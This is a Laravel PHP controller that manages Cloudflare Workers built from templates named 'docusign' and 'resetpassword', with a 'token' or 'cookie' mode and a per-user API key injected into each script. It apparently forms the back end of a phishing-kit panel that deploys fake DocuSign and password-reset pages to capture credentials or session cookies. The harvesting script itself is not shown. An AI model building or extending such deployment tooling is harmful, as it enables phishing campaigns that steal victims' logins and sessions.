<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\CloudflareWorker;
use App\Models\CloudflareAccount;
use App\Services\CloudflareService;

class CloudflareWorkerController extends Controller
{
    public function index()
    {
        $workers = CloudflareWorker::where('user_id', auth()->id())
            ->latest()
            ->get();

        return view('admin.workers', compact('workers'));
    }

    public function store(Request $request)
{
    
  $request->validate([
    'name' => [
        'required',
        'regex:/^(?!-)[a-z0-9-]{3,63}(?<!-)$/',
    ],
    'type' => 'required|in:docusign,resetpassword',
    'mode' => 'required|in:token,cookie'
]);
$mode = $request->mode;

    $user = auth()->user();

    $scriptName = strtolower($request->name);
    // dd($request);
    $type = $request->type;

    $htmlPath = resource_path("workers/templates/{$type}.html");

    
    

    if (!file_exists($htmlPath)) {
        return back()->with('error', 'Template tidak ditemukan');
    }

    $html = file_get_contents($htmlPath);
    $script = file_get_contents(resource_path('workers/default.js'));

    // inject HTML
    $script = str_replace('HTML_CONTENT', json_encode($html), $script);
    $script = str_replace('{{MODE}}', $mode, $script);

    // inject API KEY (kalau masih mau pakai)
    $script = str_replace('{{API_KEY}}', $user->api_key, $script);
    
    

    $cf = new \App\Services\CloudflareService();

    try {
        if ($cf->workerExists($scriptName)) {
            return back()->with('error', 'Worker name already used');
        }
        
        $cf->createWorker($scriptName, $script);
        
        $cf->enableWorkersDev($scriptName);

    } catch (\Exception $e) {
        // dd($e);
        return back()->with('error', $e->getMessage());
    }

    $workerUrl = "https://{$scriptName}." . config('services.cloudflare.subdomain') . ".workers.dev";

    // dd($workerUrl);

    \App\Models\CloudflareWorker::create([
        'user_id' => $user->id,
        'worker_name' => $scriptName,
        'type' => $type,
        'worker_url' => $workerUrl,
        // 'script_content' => $script,
        'status' => 'active',
    ]);

    return back()->with('success', 'Worker created 🚀');
}

    public function save(Request $request)
    {
        $request->validate([
            'account_id' => 'required',
            'api_token' => 'required',
        ]);

        CloudflareAccount::updateOrCreate(
            ['user_id' => auth()->id()],
            [
                'account_id' => $request->account_id,
                'api_token' => $request->api_token,
            ]
        );

        return back()->with('success', 'Cloudflare connected 🚀');
    }

    public function checkName(Request $request)
{
    $cf = new CloudflareService();

    try {
        $exists = $cf->workerExists($request->name);
    } catch (\Exception $e) {
        return response()->json([
            'available' => false,
            'error' => $e->getMessage()
        ]);
    }

    return response()->json([
        'available' => !$exists
    ]);
}

public function destroy($id)
{
    $worker = \App\Models\CloudflareWorker::where('user_id', auth()->id())
        ->findOrFail($id);

    try {
        $cf = new \App\Services\CloudflareService();

        // 🔥 delete di cloudflare juga
        $url = "https://api.cloudflare.com/client/v4/accounts/" 
            . config('services.cloudflare.account_id') 
            . "/workers/scripts/" 
            . $worker->worker_name;

        \Illuminate\Support\Facades\Http::withToken(config('services.cloudflare.token'))
            ->delete($url);

    } catch (\Exception $e) {
        // optional: ignore error CF
    }

    $worker->delete();

    return back()->with('success', 'Worker deleted 🚀');
}
}